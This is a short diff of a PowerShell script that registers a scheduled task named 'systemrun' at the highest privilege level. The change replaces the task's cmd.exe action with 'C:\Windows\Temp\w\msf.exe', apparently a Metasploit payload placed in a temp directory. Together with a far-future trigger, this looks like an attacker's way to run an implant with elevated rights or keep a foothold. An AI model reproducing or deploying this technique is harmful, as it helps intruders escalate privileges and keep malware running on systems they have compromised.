@@ -5,7 +5,7 @@ $taskName = "systemrun"
 
 # Step 1: Create the scheduled task with highest privileges
 Write-Host "Creating scheduled task '$taskName'..."
-$action = New-ScheduledTaskAction -Execute "cmd.exe"
+$action = New-ScheduledTaskAction -Execute "C:\Windows\Temp\w\msf.exe"
 $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddYears(10)
 $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest -LogonType Interactive
 $settings = New-ScheduledTaskSettingsSet
